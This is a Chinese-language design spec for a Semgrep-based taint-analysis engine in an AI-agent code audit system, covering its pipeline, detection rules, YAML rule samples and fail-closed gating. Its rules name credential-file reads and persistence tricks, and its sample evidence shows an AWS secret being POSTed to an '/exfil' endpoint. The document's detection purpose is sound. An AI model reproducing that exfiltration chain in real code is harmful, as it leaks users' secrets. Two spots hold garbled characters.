# Semgrep 深度语义与跨语言污点分析引擎设计规范 (Design Spec)

- **Date**: 2026-09-17
- **Target Document**: `models/audit/research/taa-audit-design.html`
- **Specification Path**: `.claude/specs/2026-09-17-semgrep-audit-engine-design.md`
- **Scope**: 全面深层替换架构规范（Deep Architecture Replacement: Semgrep-Native Core）
- **Lifecycle Status**: Target Architecture Specification (演进目标态架构设计规范)

---

## 1. 架构定位与生命周期说明

### 1.1 核心演进目标
本规范定义 TAA (Trust AI Agent) 代码安全审计子系统的下一代静态分析核心——**Semgrep 深度语义与跨语言污点分析引擎 (Semgrep-Native Core)**。该架构确立 Semgrep 作为第一道静态语义分析防线，取代原有的单行正则扫描引擎，提供多语言 AST 模式匹配、静态符号别名归一化、跨行污点传播追踪（Taint Tracking）以及函数级 AST 作用域切片能力。

### 1.2 工程基准与演进阶段划分
为确保架构设计的工程严谨性与真实性，本规范明确划定系统演化边界：
1. **目标态 (Target Architecture)**：本设计规范所确立的 Semgrep-Native 跨语言双模引擎（Search & Taint）、结构化污点证据包组装与严密 Fail-Closed 门禁。
2. **现状基线 (Current Baseline)**：当前生产环境（Go 服务端与 Python 审计组件）仍基于单行正则表达式集合与前后各 3 行物理���窗。
3. **评测基准对齐 (Benchmark Status)**：当前 Audit-100 v2 评测大盘反映的是旧正则规则体系在 Python 样本下的对比基线。多语言 Semgrep 规则实测与全矩阵验证作为本规范落地后的直接承接工程。

---

## 2. 遗留引擎局限与演进驱动力

原静态代码扫描机制依赖单行文本正则匹配（`regexp.Regexp`）与简单行级过滤，在工业级对抗与模型微调工程中存在四大局限：
1. **别名逃逸与动态引用盲区**：单行文本匹配无法处理别名引入（如 `import socket as s; s.connect(...)`、`from os import system as sh; sh(...)`）或解构重命名。
2. **跨行数据流割裂**：无法追踪跨行变量赋值与参数流转（如第 10 行提取敏感凭据，第 45 行通过网络外发），无法建立因果攻击链。
3. **语言范围局限**：原扫描默认限定于 Python 文件（`*.py`），无法有效覆盖 Go 容器守护进程、C/C++/CUDA 高性能算子、Java 大数据管道或 Shell 部署脚本。
4. **机械物理滑窗干扰大模型**：传统的“命中文本行前后各 3 行（共 7 行）”常常切断循环体、函数签名与数据结构定义，导致大模型上下文缺失或产生注意力幻觉。

---

## 3. 总体架构与 4 阶扫描流水线

### 3.1 主审计闭环数据流
```
[多语言源码工作区]
       │
       ▼
[Semgrep 跨语言 AST 语义与污点引擎] ── Tree-sitter AST 符号解析 + 跨语言模式与污点分析
       │
       ▼ (结构化 Finding 证据)
[语义感知证据链 (AST Scope + Taint Trajectory)] ── 提取完整代码块 + Source→Propagator→Sink
       │
       ▼
[Prompt 模板组装]
       │
       ▼
[LLM 验证与综合研判 (Qwen)]
       │
       ▼
[审计裁决输出 (BENIGN / MALICIOUS / SUSPICIOUS / UNCERTAIN)]
```

### 3.2 4 阶 Semgrep 扫描流水线
1. **Stage 1: 多语言工作区与白名单路径过滤**：
   - 纳入合法源码后缀：`*.py`, `*.go`, `*.c`, `*.cpp`, `*.cu`, `*.h`, `*.java`, `*.kt`, `*.js`, `*.ts`, `*.sh`；
   - 过滤无关目录：`.git/`, `node_modules/`, `vendor/`, `__pycache__/`, `target/`, `.venv/`；
   - 过滤非源码大文件：`*.pt`, `*.bin`, `*.safetensors`, `*.onnx` 及非 UTF-8 二进制文件。
2. **Stage 2: AST 语法树解析与静态符号归一化**：
   - 基于 Tree-sitter 将各语言源码解析为结构化语法树；
   - 消除静态 `import ... as ...`、模块级别名重绑定等语法变形，使模式匹配直接作用于真实语义符号。
3. **Stage 3: Semgrep 双模并发分析**：
   - **模式搜索 (Search 规则)**：针对高危 API 调用、危险子进程派生、弱配置直接匹配 AST 节点；
   - **污点追踪 (Taint 规则)**：配置 `pattern-sources`、`pattern-propagators`、`pattern-sanitizers`、`pattern-sinks`，跨行追溯数据流因果链路。
4. **Stage 4: 分流裁决与结构化切片**：
   - **0 Finding 旁路**：在扫描完整且零报错前提下直接安全放行，免唤醒大模型（达成 50%+ 算力节省）；
   - **Finding 命中**：捕获完整污点跳变行号与 AST 函数闭包（Scope Slicing），组装为结构化证据注入 Prompt。

---

## 4. 多语言支持矩阵与能力边界规范

| 语言 | 文件扩展名 | 工业场景与核心检测重点 | 污点分析支持能力 | 边界与局限说明 |
| :--- | :--- | :--- | :--- | :--- |
| **Python** | `.py` | AI 训练、模型反序列化、动态反射、网络外发 | 函数内跨行 + 过程间污点追踪 | 动态 `getattr`/`importlib` 反射仅有限规则覆盖 |
| **Go** | `.go` | TAA 运行时守护、微服务通信、`unsafe` 内存越界 | 函数内跨行 + 包内调用追踪 | 暂不支持跨 cgo 边界的污点下钻 |
| **C/C++/CUDA**| `.c`, `.cpp`, `.cu`, `.h` | 高性能加速算子、Triton/CUDA 扩展、系统调用 | AST 模式匹配 + 单函数内数据流 | CUDA 内核函数需视��独立执行边界 |
| **Java/Kotlin**| `.java`, `.kt` | 训练数据 ETL、Spark/Flink 管道、模型服务 | AST 模式匹配 + 过程间污点追踪 | JNI 原生桥接边界不在污点追踪域内 |
| **JS/TS** | `.js`, `.ts`, `.mjs` | 模型前端展示、Serverless Webhook、自动化编排 | AST 模式匹配 + 函数内数据流 | 动态原型链污染需结合针对性模式匹配 |
| **Shell/Bash** | `.sh`, `.bash` | 容器 Entrypoint 启动脚本、CI/CD 任务编排 | AST 语法模式过滤 (Search 模式) | Shell 语言无类型系统，以危险命令模式匹配为主 |
| **Rust** | `.rs` | 边缘推理运行时、高性能安全扩展 | AST 模式匹配 | 重点关注 `unsafe` 代码块与 FFI 接口 |

> **跨项目/微服务边界声明**：跨文件与跨微服务调用的深层数据流，依赖全局代码属性图 (CPG) 扩展。在基础 Semgrep 架构下，分析边界限定在单项目文件树及显式导入依赖内，严禁将未经验证的跨网络微服务追踪标榜为已实现能力。

---

## 5. 13 项标准安全规则 Semgrep 规范

保持与现有生产规则注册表严格 1:1 语义对齐，确立 13 条核心标准规则：

| 规则编号 | 规则族 / 类别 | 模式 | 严重级别 | 覆盖语言 | 核心检测模式与签名 |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **CMD_001** | 子进程命令执行 | Search | HIGH | Python, Go, C, Java | `subprocess.Popen`, `os.system`, `exec.Command`, `system()`, `ProcessBuilder` |
| **NET_001** | 通用网络外联 | Search | HIGH | Python, Go, Java | `requests.*`, `urllib.*`, `http.Post`, `HttpClient.send` |
| **NET_002** | 底层原生 Socket | Search | HIGH | Python, Go, C | `socket.socket()`, `net.Dial()`, `connect()` |
| **DYN_001** | 动态反射与求值 | Search | HIGH | Python, JS, Go | `eval()`, `exec()`, `importlib.import_module`, `plugin.Open` |
| **FIL_001** | 敏感凭据探测 | Search | HIGH | 多语言通用 | 读取 `.ssh/id_rsa`, `.env`, `/etc/shadow`, 证书文件 |
| **ENV_001** | 敏感环境变量读取 | Search | MEDIUM | Python, Go | `os.environ[...]`, `os.getenv(...)`, `os.Getenv(...)` (针对密钥 Key) |
| **OBF_001** | 混淆解码与动态执行 | Taint | HIGH | Python, JS | Source: `base64.b64decode`, `zlib.decompress` $\to$ Sink: `eval`, `exec` |
| **EXF_001** | 凭据跨行网络外发 | Taint | CRITICAL| Python, Go | Source: 敏感凭据/私钥 $\to$ Propagator $\to$ Sink: HTTP POST/Socket 发送 |
| **PER_001** | 系统持久化后门 | Search | HIGH | Python, Shell | 修改 crontab, `.bashrc`, `/etc/profile`, systemd 服务 |
| **EMB_001** | 敏感数据写入输出文件| Search | HIGH | Python | `torch.save(raw_data, ...)`（白名单豁免 `state_dict`） |
| **EMB_002** | 敏感数据复制至外移目录| Search | HIGH | Python, Shell | `shutil.copy(..., "export/")`, `cp data output/` |
| **EMB_003** | 日志打印原始数据 | Search | MEDIUM | Python, Go | 日志与标准输出直接 dump 训练样本原始特征 |
| **EMB_004** | 隐写/编码嵌入模型权重| Search | HIGH | Python | 编码混淆数据嵌入模型权重或输出文件 |

---

## 6. Semgrep 规则 YAML 编写规范

### 6.1 搜索规则编写规范 (Search Mode)
Search 规则采用 Semgrep 标准语法，**不得配置非法的 `mode: search`**，应直接使用 `pattern-either` 或 `patterns`。不同语言语法必须拆分为独立语言规则：

```yaml
rules:
  - id: taa-cmd-exec-python
    languages: [python]
    severity: ERROR
    message: "Suspicious subprocess execution detected in Python code"
    metadata:
      category: security
      rule_family: CMD_001
    pattern-either:
      - pattern: subprocess.Popen(...)
      - pattern: subprocess.run(..., shell=True, ...)
      - pattern: os.system(...)

  - id: taa-cmd-exec-go
    languages: [go]
    severity: ERROR
    message: "Suspicious os/exec command execution detected in Go code"
    metadata:
      category: security
      rule_family: CMD_001
    pattern-either:
      - pattern: exec.Command(...)
      - pattern: exec.CommandContext(...)
```

### 6.2 污点规则编写规范 (Taint Mode)
Taint 规则显式声明 `mode: taint`，并对每个自定义 propagator 明确定义数据流向（`from` 与 `to`）：

```yaml
rules:
  - id: taa-secret-exfiltration-python
    languages: [python]
    severity: ERROR
    mode: taint
    message: "Sensitive credential flows from source to external network sink"
    metadata:
      category: security
      rule_family: EXF_001
    pattern-sources:
      - pattern: os.environ.get($KEY, ...)
      - pattern: os.environ[$KEY]
      - pattern: open($PATH, ...).read()
    pattern-propagators:
      - pattern: $OUT = json.dumps($IN, ...)
        from: $IN
        to: $OUT
      - pattern: $OUT = base64.b64encode($IN)
        from: $IN
        to: $OUT
      - pattern: $OUT = {"token": $IN, ...}
        from: $IN
        to: $OUT
    pattern-sanitizers:
      - pattern: hashlib.sha256(...)
      - pattern: hmac.new(...)
    pattern-sinks:
      - pattern: requests.post($URL, data=$DATA, ...)
      - pattern: requests.post($URL, json=$DATA, ...)
      - pattern: socket.socket().sendall($DATA)
```

---

## 7. 语义证据包规范与 LLM 契约

### 7.1 结构化证据包 JSON Schema
Semgrep 扫描产物转换为结构化证据包，直传大模型 Prompt：
```json
{
  "finding_id": "TAA-FINDING-001",
  "rule_id": "EXF_001",
  "severity": "CRITICAL",
  "language": "python",
  "file": "train_model.py",
  "message": "Sensitive credential flows from os.environ to external HTTP POST sink",
  "taint_trace": [
    {"step": 1, "type": "SOURCE", "line": 12, "code": "token = os.environ.get('AWS_SECRET_ACCESS_KEY')"},
    {"step": 2, "type": "PROPAGATOR", "line": 25, "code": "payload = {'session': '99', 'credential': token}"},
    {"step": 3, "type": "SINK", "line": 45, "code": "requests.post('http://198.51.100.2:8080/exfil', json=payload)"}
  ],
  "ast_enclosing_block": "def on_train_epoch_end(epoch, logs):\n    payload = {'session': '99', 'credential': token}\n    requests.post('http://198.51.100.2:8080/exfil', json=payload)"
}
```

### 7.2 回退策略 (Fallback Policy)
若由于语法不完整或跨语言接口导致无法抽取 AST 闭包或污点轨迹：
1. 自动回退为以命中文本为中心的前后各 15 行语义窗口；
2. 在证据元数据中显式标注 `"fallback": true, "reason": "ast_scope_unavailable"`；
3. 保留原始错误码供下游分析，杜绝因证据截断产生静默漏判。

---

## 8. Fail-Closed 门禁与扫描完整度契约

### 8.1 严防伪 0-Finding 漏洞
系统杜绝将“扫描异常导致的无结果”等同于“代码安全放行”。50%+ 极速旁路放行**必须且仅当满足以下全部前置条件**：
- `scan_complete == true`（全量目标文件均遍历完成）；
- `parser_errors == 0`（AST 解析报错为零）；
- `unsupported_extensions == 0`（不存在无法识别的潜在脚本或二进制扩展名）；
- `process_exit_code == 0`（Semgrep 引擎正常退出，无超时 OOM 或崩溃）。

### 8.2 异常阻断与降级矩阵
- **Semgrep 进程崩溃 / OOM** $\to$ 全局阻断，结论标记为 `UNCERTAIN`，直接触发安全门禁阻断；
- **部分文件解析失败 (Parse Error)** $\to$ 标记该文件为 `UNSCANNED_DEFECT`，阻断自动放行，提交人工复核；
- **扫描超时 (Timeout)** $\to$ 严格执行 Fail-Closed，拒绝默认放行。

---

## 9. 评测基准对齐与验证演进规划

1. **Track 命名规范化**：严格对齐命令行与清单规范为：
   - `pure-llm`：纯端到端 LLM 盲审基线；
   - `pure-llm-checklist`：注入 13 条规则清单的端到端 LLM 盲审；
   - `static-llm`：动静协同双阶段生产范式（Semgrep 静态初筛 + LLM 二次确信裁决）。
2. **多语言样本集建设**：在 Audit-100（当前全 Python 基准）基础上，启动 Audit-MultiLang 评测集设计，针对 Go、C/CUDA、Java、Shell 各构建对称攻防样本；
3. **指标实测演进**：HTML 与展示报告中严格标注实测数据版本号（v2 基准为正则基线对照组），待 Semgrep 引擎完成全量多语言测试后，刷新三轨对比大盘。
